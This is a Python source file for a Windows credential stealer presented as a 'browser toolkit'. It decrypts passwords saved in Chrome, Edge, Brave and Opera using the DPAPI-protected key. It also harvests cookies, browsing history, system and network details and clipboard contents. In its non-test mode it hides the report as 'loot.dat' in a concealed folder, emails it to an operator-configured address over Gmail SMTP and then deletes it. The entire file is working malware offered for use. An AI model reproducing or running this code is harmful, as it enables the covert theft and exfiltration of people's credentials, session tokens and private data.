import os
import json
import base64
import shutil
import sqlite3
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import pyperclip
import platform
import socket
import re
import uuid
import requests
import smtplib
from email.message import EmailMessage
from datetime import datetime
import logging
from pathlib import Path


# === CONFIGURATION ===
SENDER_EMAIL = ""
APP_PASSWORD = ""
RECIPIENT_EMAIL = ""
# =====================


class BrowserToolkit:
    def __init__(self, debug_mode=False):
        self.browser_paths = self.get_all_browser_paths()
        self.debug_mode = debug_mode
        self.setup_logging()

    def setup_logging(self):
        """Setup logging for debugging"""
        log_level = logging.DEBUG if self.debug_mode else logging.INFO
        logging.basicConfig(
            level=log_level,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler("browser_extraction.log"),
                logging.StreamHandler(),
            ],
        )
        self.logger = logging.getLogger(__name__)

    def get_all_browser_paths(self):
        """Get paths for all supported browsers"""
        user_dir = os.environ["USERPROFILE"]
        return {
            "Chrome": (
                os.path.join(
                    user_dir, "AppData", "Local", "Google", "Chrome", "User Data"
                ),
                "chromium",
            ),
            "Brave": (
                os.path.join(
                    user_dir,
                    "AppData",
                    "Local",
                    "BraveSoftware",
                    "Brave-Browser",
                    "User Data",
                ),
                "chromium",
            ),
            "Opera": (
                os.path.join(
                    user_dir, "AppData", "Roaming", "Opera Software", "Opera Stable"
                ),
                "opera",
            ),
            "OperaGX": (
                os.path.join(
                    user_dir, "AppData", "Roaming", "Opera Software", "Opera GX Stable"
                ),
                "operagx",
            ),
            "Edge": (
                os.path.join(
                    user_dir, "AppData", "Local", "Microsoft", "Edge", "User Data"
                ),
                "chromium",
            ),
            "Firefox": (
                os.path.join(
                    user_dir, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"
                ),
                "firefox",
            ),
        }

    def find_profiles(self, base_path, kind="chromium"):
        """Find browser profiles"""
        profiles = []
        if kind == "firefox":
            if os.path.isdir(base_path):
                for name in os.listdir(base_path):
                    p = os.path.join(base_path, name)
                    if os.path.isdir(p):
                        profiles.append(p)
            return profiles
        if kind in ("opera", "operagx") and os.path.isdir(base_path):
            profiles.append(base_path)
            return profiles
        if os.path.isdir(base_path):
            for name in os.listdir(base_path):
                p = os.path.join(base_path, name)
                if os.path.isdir(p) and (
                    name == "Default" or name.startswith("Profile")
                ):
                    profiles.append(p)
        return profiles

    def get_decryption_key(self, local_state_path):
        """Extract decryption key from Local State"""
        try:
            if not os.path.exists(local_state_path):
                return None
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
            return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            if self.debug_mode:
                self.logger.error(f"Error getting decryption key: {e}")
            return None

    def decrypt_password(self, buff, key):
        """Decrypt password buffer"""
        try:
            if not buff:
                return None
            if buff.startswith(b"v20"):
                return "v20_not_supported"
            if buff.startswith(b"v10") or buff.startswith(b"v11"):
                iv = buff[3:15]
                payload = buff[15:]
                tag = payload[-16:]
                encrypted_password = payload[:-16]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt_and_verify(encrypted_password, tag).decode()
            else:
                return CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except Exception as e:
            if self.debug_mode:
                self.logger.error(f"Error decrypting password: {e}")
            return None

    def extract_firefox_passwords(self, profile_path):
        """Extract passwords from Firefox (requires additional decryption)"""
        credentials = []
        login_db_path = os.path.join(profile_path, "logins.json")

        if not os.path.exists(login_db_path):
            return credentials

        try:
            with open(login_db_path, "r", encoding="utf-8") as f:
                login_data = json.load(f)

            for login in login_data.get("logins", []):
                credentials.append(
                    {
                        "browser": "Firefox",
                        "profile": os.path.basename(profile_path),
                        "url": login.get("hostname", "N/A"),
                        "username": login.get("encryptedUsername", "N/A"),
                        "password": "ENCRYPTED (NSS3 decryption required)",
                    }
                )
        except Exception as e:
            if self.debug_mode:
                self.logger.error(f"Error extracting Firefox passwords: {e}")

        return credentials

    def extract_cookies(self, browser_name, profile_path, kind="chromium"):
        """Extract cookies from browser"""
        cookies = []

        if kind == "firefox":
            cookies_db = os.path.join(profile_path, "cookies.sqlite")
        else:
            cookies_db = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_db):
                cookies_db = os.path.join(profile_path, "Cookies")

        if not os.path.exists(cookies_db):
            return cookies

        temp_copy = "CookiesTemp.db"
        try:
            shutil.copy2(cookies_db, temp_copy)
            conn = sqlite3.connect(temp_copy)
            cursor = conn.cursor()

            if kind == "firefox":
                cursor.execute("SELECT host, name, value FROM moz_cookies LIMIT 100")
            else:
                cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 100")

            for host, name, value in cursor.fetchall():
                cookies.append(
                    {
                        "browser": browser_name,
                        "host": host,
                        "name": name,
                        "value": value[:50] + "..." if len(str(value)) > 50 else value,
                    }
                )

            cursor.close()
            conn.close()
        except Exception as e:
            if self.debug_mode:
                self.logger.error(f"Error extracting cookies: {e}")
        finally:
            if os.path.exists(temp_copy):
                os.remove(temp_copy)

        return cookies

    def extract_history(self, browser_name, profile_path, kind="chromium", limit=50):
        """Extract browsing history"""
        history = []

        if kind == "firefox":
            history_db = os.path.join(profile_path, "places.sqlite")
        else:
            history_db = os.path.join(profile_path, "History")

        if not os.path.exists(history_db):
            return history

        temp_copy = "HistoryTemp.db"
        try:
            shutil.copy2(history_db, temp_copy)
            conn = sqlite3.connect(temp_copy)
            cursor = conn.cursor()

            if kind == "firefox":
                cursor.execute(
                    f"SELECT url, title, visit_count FROM moz_places ORDER BY visit_count DESC LIMIT {limit}"
                )
            else:
                cursor.execute(
                    f"SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT {limit}"
                )

            for url, title, count in cursor.fetchall():
                history.append(
                    {
                        "browser": browser_name,
                        "url": url,
                        "title": title if title else "N/A",
                        "visits": count,
                    }
                )

            cursor.close()
            conn.close()
        except Exception as e:
            if self.debug_mode:
                self.logger.error(f"Error extracting history: {e}")
        finally:
            if os.path.exists(temp_copy):
                os.remove(temp_copy)

        return history

    def extract_browser_passwords(self, filter_browser=None):
        """Extract passwords from all browsers"""
        credentials = []
        failed = []
        browsers = self.browser_paths

        for browser_name, (browser_path, kind) in browsers.items():
            if filter_browser and browser_name != filter_browser:
                continue

            if self.debug_mode:
                self.logger.info(f"Scanning {browser_name}...")

            profiles = self.find_profiles(browser_path, kind)

            for profile_path in profiles:
                if kind == "firefox":
                    creds = self.extract_firefox_passwords(profile_path)
                    credentials.extend(creds)
                    continue

                if kind in ("opera", "operagx"):
                    local_state_path = os.path.join(profile_path, "Local State")
                    login_db_path = os.path.join(profile_path, "Login Data")
                    profile_label = "(Opera profile)"
                else:
                    local_state_path = os.path.join(browser_path, "Local State")
                    login_db_path = os.path.join(profile_path, "Login Data")
                    profile_label = os.path.basename(profile_path)

                if not os.path.exists(local_state_path):
                    continue

                key = self.get_decryption_key(local_state_path)
                if not key or not os.path.exists(login_db_path):
                    continue

                temp_copy = "LoginDataTemp.db"
                try:
                    shutil.copy2(login_db_path, temp_copy)
                    conn = sqlite3.connect(temp_copy)
                    cursor = conn.cursor()
                    cursor.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"
                    )

                    for url, user, pwd in cursor.fetchall():
                        password = self.decrypt_password(pwd, key)
                        if password == "v20_not_supported":
                            failed.append(
                                {
                                    "browser": browser_name,
                                    "profile": profile_label,
                                    "url": url,
                                    "username": user,
                                    "reason": "v20 encryption format not supported",
                                }
                            )
                        elif password:
                            credentials.append(
                                {
                                    "browser": browser_name,
                                    "profile": profile_label,
                                    "url": url,
                                    "username": user,
                                    "password": password,
                                }
                            )

                    cursor.close()
                    conn.close()
                except Exception as e:
                    if self.debug_mode:
                        self.logger.error(f"Error processing {browser_name}: {e}")
                finally:
                    if os.path.exists(temp_copy):
                        os.remove(temp_copy)

        return credentials, failed

    def extract_all_cookies(self):
        """Extract cookies from all browsers"""
        all_cookies = []

        for browser_name, (browser_path, kind) in self.browser_paths.items():
            profiles = self.find_profiles(browser_path, kind)
            for profile_path in profiles:
                cookies = self.extract_cookies(browser_name, profile_path, kind)
                all_cookies.extend(cookies)

        return all_cookies

    def extract_all_history(self, limit=50):
        """Extract history from all browsers"""
        all_history = []

        for browser_name, (browser_path, kind) in self.browser_paths.items():
            profiles = self.find_profiles(browser_path, kind)
            for profile_path in profiles:
                history = self.extract_history(browser_name, profile_path, kind, limit)
                all_history.extend(history)

        return all_history


def get_system_info():
    """Gather comprehensive system information"""
    system_info_lines = []
    try:
        info = {
            "platform": platform.system(),
            "platform-release": platform.release(),
            "platform-version": platform.version(),
            "architecture": platform.machine(),
            "hostname": socket.gethostname(),
            "ip-address": socket.gethostbyname(socket.gethostname()),
            "mac-address": ":".join(re.findall("..", "%012x" % uuid.getnode())),
            "processor": platform.processor(),
            "python-version": platform.python_version(),
        }

        try:
            response = requests.get("https://api.ipify.org?format=json", timeout=5)
            global_ip = response.json().get("ip", "N/A")
            info["global-ip-address"] = global_ip
        except Exception:
            info["global-ip-address"] = "Could not fetch global IP"

        for key, value in info.items():
            system_info_lines.append(f"{key}: {value}")
    except Exception as e:
        system_info_lines.append(f"Error capturing system info: {e}")

    return system_info_lines


def get_clipboard():
    """Get clipboard content"""
    try:
        return pyperclip.paste()
    except Exception:
        return "Could not access clipboard"


def send_email_with_attachment(sender, app_password, recipient, file_path):
    """Send email with attachment"""
    msg = EmailMessage()
    msg["Subject"] = (
        f"Browser Extraction Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    msg["From"] = sender
    msg["To"] = recipient
    msg.set_content(
        "Attached is the browser extraction report.\n\nGenerated by Enhanced Browser Toolkit"
    )

    with open(file_path, "rb") as f:
        data = f.read()
        msg.add_attachment(
            data,
            maintype="application",
            subtype="octet-stream",
            filename=os.path.basename(file_path),
        )

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(sender, app_password)
        smtp.send_message(msg)


def main(test_mode=False, extract_cookies=True, extract_history=True):
    """
    Main function

    Args:
        test_mode: If True, saves report locally without emailing
        extract_cookies: If True, extracts cookies
        extract_history: If True, extracts browsing history
    """
    toolkit = BrowserToolkit(debug_mode=test_mode)

    print("[*] Starting browser data extraction...")

    # Extract passwords
    print("[*] Extracting passwords...")
    creds, failed = toolkit.extract_browser_passwords()
    print(f"[+] Found {len(creds)} credentials")

    # Extract cookies
    cookies = []
    if extract_cookies:
        print("[*] Extracting cookies...")
        cookies = toolkit.extract_all_cookies()
        print(f"[+] Found {len(cookies)} cookies")

    # Extract history
    history = []
    if extract_history:
        print("[*] Extracting browsing history...")
        history = toolkit.extract_all_history(limit=50)
        print(f"[+] Found {len(history)} history entries")

    # System info
    print("[*] Gathering system information...")
    system_info = get_system_info()

    # Clipboard
    print("[*] Reading clipboard...")
    clipboard_content = get_clipboard()

    # Build report
    report = []
    report.append("=" * 80)
    report.append(
        f"BROWSER EXTRACTION REPORT - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    report.append("=" * 80)
    report.append("")

    # Passwords
    report.append("=" * 80)
    report.append("CREDENTIALS")
    report.append("=" * 80)
    for cred in creds:
        report.append("-" * 40)
        report.extend(f"{k}: {v}" for k, v in cred.items())
        report.append("-" * 40)

    if failed:
        report.append("")
        report.append("FAILED TO DECRYPT:")
        for f in failed:
            report.append("-" * 40)
            report.extend(f"{k}: {v}" for k, v in f.items())
            report.append("-" * 40)

    # Cookies
    if cookies:
        report.append("")
        report.append("=" * 80)
        report.append("COOKIES (Sample)")
        report.append("=" * 80)
        for cookie in cookies[:100]:  # Limit to first 100
            report.append(f"{cookie['browser']} | {cookie['host']} | {cookie['name']}")

    # History
    if history:
        report.append("")
        report.append("=" * 80)
        report.append("BROWSING HISTORY (Top Visited)")
        report.append("=" * 80)
        for h in history[:50]:  # Limit to top 50
            report.append(f"[{h['visits']} visits] {h['url']}")
            report.append(f"  Title: {h['title']}")
            report.append("")

    # System info
    report.append("")
    report.append("=" * 80)
    report.append("SYSTEM INFORMATION")
    report.append("=" * 80)
    report.extend(system_info)

    # Clipboard
    report.append("")
    report.append("=" * 80)
    report.append("CLIPBOARD CONTENT")
    report.append("=" * 80)
    report.append(str(clipboard_content))

    # Save report
    if test_mode:
        # In test mode, save to current directory
        output_file = "extraction_report.txt"
        with open(output_file, "w", encoding="utf-8") as f:
            f.write("\n".join(report))
        print(f"\n[+] Report saved to: {output_file}")
        print(f"[+] Total credentials: {len(creds)}")
        print(f"[+] Total cookies: {len(cookies)}")
        print(f"[+] Total history entries: {len(history)}")
    else:
        # Production mode: save to hidden folder and email
        user_dir = os.environ["USERPROFILE"]
        hidden_folder = os.path.join(user_dir, "AppData", "Local", "SysDataHidden")
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder)
            import ctypes

            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(
                hidden_folder, FILE_ATTRIBUTE_HIDDEN
            )

        data_filename = os.path.join(hidden_folder, "loot.dat")
        with open(data_filename, "w", encoding="utf-8") as f:
            f.write("\n".join(report))

        # Email the file
        print("[*] Sending report via email...")
        send_email_with_attachment(
            SENDER_EMAIL, APP_PASSWORD, RECIPIENT_EMAIL, data_filename
        )
        print("[+] Report sent successfully!")

        # Delete the file
        os.remove(data_filename)
        print("[+] Cleanup completed")


if __name__ == "__main__":
    import sys

    # Check for test mode flag
    test_mode = "--test" in sys.argv or "-t" in sys.argv

    if test_mode:
        print("[TEST MODE] Running in test mode - no email will be sent")
        main(test_mode=True, extract_cookies=True, extract_history=True)
    else:
        if not SENDER_EMAIL or not APP_PASSWORD or not RECIPIENT_EMAIL:
            print(
                "[ERROR] Please configure SENDER_EMAIL, APP_PASSWORD, and RECIPIENT_EMAIL"
            )
            sys.exit(1)
        main(test_mode=False, extract_cookies=True, extract_history=True)
